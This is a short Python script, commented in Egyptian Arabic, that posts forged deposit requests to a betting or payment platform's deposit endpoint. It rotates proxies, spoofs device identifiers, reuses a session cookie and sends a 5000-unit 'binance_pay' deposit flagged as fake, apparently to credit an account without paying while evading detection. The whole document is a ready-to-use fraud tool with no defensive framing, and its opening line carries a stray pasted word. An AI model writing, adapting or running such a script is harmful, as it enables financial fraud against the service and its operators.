hereimport requests, random, time
from proxies import proxies  # هتعمل ملف proxies.py وتحط فيه القايمة

def fake_deposit(amount, cookie):
    proxy = random.choice(proxies)
    headers = {
        "User-Agent": "PariPulse/19",
        "Cookie": cookie,
        "Content-Type": "application/json",
        "x-device-id": f"fake_{random.randint(100000,999999)}"
    }
    data = {"amount": amount, "method": "binance_pay", "fake": True}
    r = requests.post("https://api.paripulse.com/v3/deposit", json=data, headers=headers, proxies=proxy, timeout=10)
    return r.text

# Example usage
print(fake_deposit(5000, "PAY_SESSION=abc123; token=xyz"))
